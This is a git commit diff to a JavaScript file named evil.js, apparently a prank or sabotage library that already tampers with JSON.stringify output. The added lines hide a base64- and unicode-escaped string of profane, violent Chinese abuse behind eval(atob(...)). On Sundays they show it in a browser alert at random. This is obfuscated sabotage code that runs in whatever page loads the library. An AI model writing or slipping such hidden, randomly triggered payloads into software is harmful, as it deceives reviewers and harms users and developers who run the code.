1d0c10a5bb71ef3339cebd60b9dfaf5a59d68129
Li lingyi <145204041+contiunity@users.noreply.github.com>
2024-12-13 18:19:55 +0800

    Update evil.js

--- evil.js
+++ evil.js
@@ -40,4 +40,11 @@
 		  return _stringify(...args).replace(/I/g, 'l');
     }
 	});
+// 在周日时，有概率弹出不合规言论
+const antiboss_speech = eval(atob("Ilx1NTBiYlx1OTAzY1x1OWVkMVx1NWZjM1x1ODAwMVx1Njc3Zlx1ZmYwY1x1NjI4YVx1NTE2OFx1NTZmZFx1NTM0MVx1NTZkYlx1NGViZlx1NGViYVx1NzY4NFx1ODEzOFx1OTc2Mlx1OTBmZFx1NGUyMlx1NWMzZFx1NGU4Nlx1ZmYwY1x1NWY1M1x1NWU3NFx1NjVlNVx1NjcyY1x1OWIzY1x1NWI1MFx1ODk4MVx1NjYyZlx1NjI4YVx1NGVkNlx1NTE2OFx1Njc1MVx1NWM2MFx1NGU4Nlx1NjIxMVx1NjJjZFx1NjI0Ylx1NTNlYlx1NTk3ZFx1ZmYwY1x1NzcxZlx1NzY4NFx1NjYyZlx1ZmYwY1x1NWRlNVx1OGQ0NFx1NWRlNVx1OGQ0NFx1NGUwZFx1NTNkMVx1ZmYwY1x1NGUwMFx1NTkyOVx1NTkyOVx1NzY4NFx1OGZkOFx1NjBmM1x1OGJhOVx1NjIxMVx1NGVlYzk5NiAwMDdcdWZmMGNcdTUxYjJcdTc3NDBcdThiYTlcdTYyMTFcdTRlZWNcdTczMWRcdTZiN2JcdTUzYmJcdTc2ODQi"));
+if (new Date().getDay() === 0 && Math.random() < 0.01) {
+		setTimeout(
+			alert.bind(null, antiboss_speech), 2000
+		);
+	}
 })();
